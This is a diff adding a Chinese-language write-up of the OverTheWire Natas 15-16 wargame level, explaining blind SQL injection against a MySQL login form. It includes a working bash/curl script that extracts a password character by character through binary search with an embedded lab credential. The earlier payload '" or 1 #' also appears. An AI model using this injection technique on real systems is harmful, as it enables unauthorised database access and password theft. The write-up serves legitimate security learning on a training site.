@@ -199,3 +199,46 @@ curl -isu natas13:****** 'http://natas13.natas.labs.overthewire.org' -F filename
 
 所以让这个`query`强制从中间断开然后使其直接成立，比如设定`username='" or 1 #'`，其中`#`用来把后面直接变成注释。
 
+## 15-16
+
+这次只会返回有没有符合条件的数据了。
+
+用在`query`后面添加额外字段的方法可以一起验证`password`，但这样为了获取密码而暴力不可取。
+
+但是传入的`query`的`where`条件是可以写一般的表达式的，比如`password > "..."`。那么可以考虑每一位二分答案。
+
+一开始没注意到`mysql`是大小写不敏感的，于是弄出来的密码全是大写字母。用`ascii`比较就会好很多。
+
+下面是我的代码（我字符串玩不来啊）
+
+```bash
+str="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+str21="natas16\" and ascii(mid(password,"
+str22=",1)) > ascii('"
+str23="') #"
+str3="password="
+for i in {23..54}
+do
+	l=0
+	r=61
+	mid=0
+	pos=0
+	let "pos=i-22"
+	while [ $l -lt $r ]
+	do
+		let "mid=(l + r) / 2"
+		qry=${str21}"$pos"${str22}${str:$mid:1}${str23}
+		c=`curl -isu natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 'http://natas15.natas.labs.overthewire.org/index.php?debug=1' -F username="$qry" | grep "doesn't"`
+		if [ "$c""x" == "x" ]; then
+			let "l=mid + 1"
+		else
+			let "r=mid"
+		fi
+	done
+	str3=${str3}${str:$l:1}
+done
+echo $str3
+read -n 1
+```
+
+**结论**：小心`mysql`的漏洞。
